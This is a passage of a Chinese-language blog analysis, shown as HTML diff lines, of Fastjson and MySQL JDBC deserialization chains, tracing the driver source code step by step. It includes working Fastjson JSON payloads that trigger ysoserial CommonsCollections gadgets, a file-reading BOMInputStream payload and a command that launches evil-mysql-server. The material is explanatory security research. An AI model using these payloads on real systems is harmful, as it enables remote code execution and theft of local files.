+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785576176167-2f70af64-5108-456f-bf57-d53679217ea4.png"></p>
+<p>调用到 <code>ConnectionImpl#initializePropsFromServer()</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785576387346-0d1048e6-916e-45a7-a16c-6d87acd7fe2b.png"></p>
+<p>调用<code>initializePropsFromServer#buildCollationMapping()</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785576401190-55fa671c-7b94-4922-b62f-6cbae9b34831.png"></p>
+<p>调用<code>results.getObject</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785576519603-9debe36d-c533-4444-9f32-5db3610715fa.png"></p>
+<p>这是参数已经完成了加载</p>
+<p>JSON 中的配置被注入到连接对象中：</p>
+<ul>
+<li><code>hostToConnectTo</code>: 目标 IP</li>
+<li><code>portToConnectTo</code>: 目标端口</li>
+<li><code>info</code>: 包含了 MySQL 客户端驱动的连接参数字典</li>
+</ul>
+<p>接着MySQL JDBC 驱动会读取 <code>info</code> 字典中的关键配置项：</p>
+<ul>
+<li><code>autoDeserialize=true</code>：告知 JDBC 驱动，如果从 MySQL 服务端获取到的字段类型为 <code>BLOB</code> 或 <code>VARBINARY</code>，且检测到序列化对象头（<code>0xAC 0xED</code>），驱动会自动对该对象调用 <code>ObjectInputStream.readObject()</code> 进行反序列化。</li>
+<li><code>statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</code>：指定连接拦截器为 <code>ServerStatusDiffInterceptor</code></li>
+</ul>
+<p>当 JDBC 驱动执行任何 SQL 查询（例如连接初始化时的查询）后，驱动会遍历已注册的拦截器，并自动调用它们的 <code>postProcess()</code> 方法，然后就会执行<code>populateMapWithSessionStatusValues()</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785587810481-d990a74b-4a19-4b35-89b4-4aff56050651.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785587819276-88740db8-ec37-4e49-9e76-96b5d37cf792.png"><code>populateMetaDataWithStatusDiff()</code> 会向攻击者的恶意 MySQL 服务端发送 <code>SHOW SESSION STATUS</code></p>
+<p> 恶意 MySQL 服务端返回伪造的包含序列化字节流的 <code>ResultSet</code></p>
+<p>然后进入<code> resultSetToMap()</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785587969107-40129489-013a-4434-8786-6bc379b04a02.png"></p>
+<p>执行 <code>rs.getObject() </code> 会对伪造的序列化字节流进行反序列化进而执行其中的恶意方法</p>
+<p>可以使用一个启动恶意mysql服务的工具github上很多，也可以让ai给推荐</p>
+<p>我这里使用<code>evil-mysql-server</code> <a target="_blank" rel="noopener" href="https://github.com/dushixiang/evil-mysql-server">https://github.com/dushixiang/evil-mysql-server</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\evil-mysql-server.exe -addr 3306 -ysoserial ..\ysoserial-all.jar</span><br></pre></td></tr></table></figure>
+
+<p>user值改为<code>yso_CommonsCollections5_calc.exe</code> 代表使用CC5链执行calc.exe</p>
+<p>注意客户端环境需要有能利用的<code>commons.collections</code></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785591414247-42d8fb6e-7dfe-40b2-aab8-ba3d2e85e020.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785591424628-cc55694a-f8df-4326-b262-2a4172eb56ae.png"></p>
+<p>那么最开始我们给的不同版本对应的payload，就需要修改对应的json</p>
+<p>具体的分析和payload篇幅有限没法写完</p>
+<h4 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h4><p><code>com.mysql.jdbc.ConnectionImpl#buildCollationMapping()</code>方法  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">buildCollationMapping</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (indexToCharset == <span class="literal">null</span>) &#123;</span><br><span class="line">    indexToCharset = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">//判断服务版本大于4.1.0且detectCustomCollations为true则进入</span></span><br><span class="line">    <span class="comment">//5.1.28此处判断条件只有服务版本大于4.1.0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">this</span>.getDetectCustomCollations()) &#123;</span><br><span class="line">        java.sql.<span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            sortedCollationMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">            customCharset = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            customMblen = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            stmt = <span class="built_in">this</span>.getMetadataSafeStatement();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//执行&quot;SHOW COLLATION&quot; SQL语句</span></span><br><span class="line">                results = stmt.executeQuery(<span class="string">&quot;SHOW COLLATION&quot;</span>);</span><br><span class="line">                <span class="comment">//若服务版本大于5.0.0进入</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.versionMeetsMinimum(<span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="comment">//调用com.mysql.jdbc.Util#resultSetToMap()方法</span></span><br><span class="line">                    Util.resultSetToMap(sortedCollationMap, results, <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span>(results.next()) &#123;</span><br><span class="line">                        sortedCollationMap.put(results.getLong(<span class="number">3</span>),</span><br><span class="line">                                               results.getString(<span class="number">2</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
+
+<p> <code>com.mysql.jdbc.Util#resultSetToMap()</code>方法  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs, <span class="type">int</span> key, <span class="type">int</span></span></span><br><span class="line"><span class="params">        value)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line"><span class="comment">//调用ResultSetImpl#getObject()方</span></span><br><span class="line">        mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> <code>ResultSetImpl#getObject()</code>方法 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="type">int</span> columnIndex)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">	<span class="built_in">this</span>.checkRowPos();</span><br><span class="line">	<span class="built_in">this</span>.checkColumnBounds(columnIndex);</span><br><span class="line">	<span class="type">int</span> <span class="variable">columnIndexMinusOne</span> <span class="operator">=</span> columnIndex - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.thisRow.isNull(columnIndexMinusOne)) &#123;</span><br><span class="line">		<span class="built_in">this</span>.wasNullFlag = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">this</span>.wasNullFlag = <span class="literal">false</span>;</span><br><span class="line">		<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="built_in">this</span>.fields[columnIndexMinusOne];</span><br><span class="line">		String stringVal;</span><br><span class="line">		<span class="keyword">switch</span> (field.getSQLType()) &#123;</span><br><span class="line">			<span class="keyword">case</span> -<span class="number">7</span>:</span><br><span class="line">				<span class="keyword">if</span> (field.getMysqlType() == <span class="number">16</span> &amp;&amp; !field.isSingleBit()) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="built_in">this</span>.getBoolean(columnIndex);</span><br><span class="line">			<span class="keyword">case</span> -<span class="number">6</span>:</span><br><span class="line">				<span class="keyword">if</span> (!field.isUnsigned()) &#123;</span><br><span class="line">					<span class="keyword">return</span> Integer.valueOf(<span class="built_in">this</span>.getByte(columnIndex));</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="built_in">this</span>.getInt(columnIndex);</span><br><span class="line">				......</span><br><span class="line">			<span class="keyword">case</span> -<span class="number">2</span>:</span><br><span class="line">				<span class="keyword">if</span> (field.getMysqlType() == <span class="number">255</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="built_in">this</span>.getObjectDeserializingIfNeeded(columnIndex);</span><br><span class="line">				......</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">getObjectDeserializingIfNeeded</span><span class="params">(<span class="type">int</span> columnIndex)</span> <span class="keyword">throws</span></span><br><span class="line">SQLException &#123;</span><br><span class="line">	<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="built_in">this</span>.fields[columnIndex - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">if</span> (!field.isBinary() &amp;&amp; !field.isBlob()) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">//field.isBinary() &amp;&amp; field.isBlob()进入</span></span><br><span class="line">		<span class="type">byte</span>[] data = <span class="built_in">this</span>.getBytes(columnIndex);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">this</span>.connection.getAutoDeserialize()) &#123;</span><br><span class="line">			<span class="keyword">return</span> data;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> data;</span><br><span class="line">			<span class="keyword">if</span> (data != <span class="literal">null</span> &amp;&amp; data.length &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="comment">//data[0] != -84 || data[1] != -19 则表明data不为java类序列化后字节码</span></span><br><span class="line">				<span class="keyword">if</span> (data[<span class="number">0</span>] != -<span class="number">84</span> || data[<span class="number">1</span>] != -<span class="number">19</span>) &#123;</span><br><span class="line">					<span class="keyword">return</span> <span class="built_in">this</span>.getString(columnIndex);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//为java序列号字节码则进行反序列化</span></span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					<span class="type">ByteArrayInputStream</span> <span class="variable">bytesIn</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">					<span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">					<span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytesIn);</span><br><span class="line">					obj = objIn.readObject();</span><br><span class="line">					objIn.close();</span><br><span class="line">					bytesIn.close();</span><br><span class="line">				&#125; <span class="keyword">catch</span> (ClassNotFoundException var7) &#123;</span><br><span class="line">					<span class="keyword">throw</span></span><br><span class="line">					SQLError.createSQLException(Messages.getString(<span class="string">&quot;ResultSet.Class_not_found___91&quot;</span>)</span><br><span class="line">												+ var7.toString() +</span><br><span class="line">												Messages.getString(<span class="string">&quot;ResultSet._while_reading_serialized_object_92&quot;</span>),</span><br><span class="line">												<span class="built_in">this</span>.getExceptionInterceptor());</span><br><span class="line">				&#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">					obj = data;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> obj;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>5.1.41版本后，不再使用<code>getObject()</code>获取”SHOW COLLATION”的结果，也就没法传递恶意的序列化数据，此链失效  </p>
+<h4 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h4><p>接下来看另一条利用链  6.0.2&#x2F;6.0.3 可用</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;connectionString&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?</span></span><br><span class="line"><span class="string">      autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.Server</span></span><br><span class="line"><span class="string">      StatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这条链子就比较简单了，构造方法如下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785652166544-cc507273-ac33-4acd-b5d3-7ea06633125e.png"></p>
+<p>那么前提就会调用到 <code>LoadBalancedConnectionProxy</code>的构造方法  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/48995099/1785652719952-1f3b96bb-fbcb-4706-ab00-e8ac485199ed.png"></p>
+<p>调用<code>pickNewConnection()</code></p>
+<p>这里会与mysql建立连接，就可以产生我们之前的恶意攻击效果</p>
+<p>6.0.4版本中构造方法改变，此利用链无法使用</p>
+<h5 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h5><p>再贴几个其他版本payload，东西太多没法全部详细分析</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;proxy&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;connectionUrl&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;masters&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;slaves&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;yso_CommonsCollections4_calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;dbname&quot;</span><span class="punctuation">:</span><span class="string">&quot;dbname&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;pass&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;queryInterceptors&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br><span class="line"><span class="string">				&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;autoDeserialize&quot;</span><span class="punctuation">:</span><span class="string">&quot;true&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;abc&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jdk.nashorn.api.scripting.URLReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:///D:/1.txt&quot;</span></span><br><span class="line">			<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="number">66</span><span class="punctuation">]</span></span><br><span class="line">		<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.abc.BOM&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>需要环境中有如下依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>x.x<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>“$ref””: “$.xx.yy”表示调用JSON对象中xx的yy属性。payload中即调用 abc(org.apache.commons.io.input.BOMInputStream的BOM属性，即调用BOMInputStream的 getBOM()方法 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteOrderMark <span class="title function_">getBOM</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.firstBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="built_in">this</span>.fbLength = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> <span class="variable">maxBomSize</span> <span class="operator">=</span> ((ByteOrderMark)<span class="built_in">this</span>.boms.get(<span class="number">0</span>)).length();</span><br><span class="line">	<span class="built_in">this</span>.firstBytes = <span class="keyword">new</span> <span class="title class_">int</span>[maxBomSize];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.firstBytes.length; ++i) &#123;</span><br><span class="line">		<span class="built_in">this</span>.firstBytes[i] = <span class="built_in">this</span>.in.read(); <span class="comment">// 从 delegate 输入流从取出所有字</span></span><br><span class="line">		节，组成一个 <span class="type">int</span> 数组</span><br><span class="line">		++<span class="built_in">this</span>.fbLength;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.firstBytes[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">this</span>.byteOrderMark = <span class="built_in">this</span>.find(); <span class="comment">// 开始把实例化对象时传入的 ByteOrderMark</span></span><br><span class="line">	数组 boms 和从 delegate 输入流从取出所有字节组成的<span class="type">int</span>数组进行比对。</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.byteOrderMark != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.include) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.byteOrderMark.length() &lt; <span class="built_in">this</span>.firstBytes.length) &#123;</span><br><span class="line">			<span class="built_in">this</span>.fbIndex = <span class="built_in">this</span>.byteOrderMark.length();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">this</span>.fbLength = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.byteOrderMark; <span class="comment">//返回 byteOrderMark</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> ByteOrderMark <span class="title function_">find</span><span class="params">()</span> 